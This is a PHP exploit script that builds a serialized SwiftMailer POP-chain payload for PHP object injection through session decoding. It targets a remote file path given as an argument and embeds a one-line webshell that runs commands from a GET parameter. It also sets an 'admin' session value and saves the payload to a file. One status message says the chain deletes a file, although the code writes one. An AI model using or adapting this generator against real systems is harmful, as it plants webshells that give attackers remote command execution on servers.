<?php
session_start();
class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream{}
class Swift_Events_SimpleEventDispatcher{}
class Swift_Transport_SendmailTransport {
    public $buffer;
    public $started;
    public $eventDispatcher;
}
abstract class Swift_ByteStream_AbstractFilterableInputStream {
    private $filters = [];
    private $writeBuffer = '<?php system($_GET["c"]) ?>//'; // simple webshell
}


if ($argc != 2) {
    echo "Usage: php $argv[0] <remote_path>\n";
    exit;
}

$remote_path = $argv[1];

$obj = new Swift_Transport_SendmailTransport();
$obj->buffer = new Swift_ByteStream_FileByteStream();
$obj->buffer->path = $remote_path;
$obj->buffer->mode = "w+";
$obj->started = true;
$obj->eventDispatcher = new Swift_Events_SimpleEventDispatcher();

// Serialize the object
$_SESSION['id_usuario'] = 'admin';
$_SESSION['pop_chains'] = $obj   ;
$payload = session_encode()      ;

echo "[+] SwiftMailer POP chain to delete file at remote: $remote_path\n";
echo "[+] FileWrite Payload:\n";
echo "[>] $payload\n";
echo "[+] Write payload to poc-session-decode.txt\n";
file_put_contents('poc-session-decode.txt', $payload);
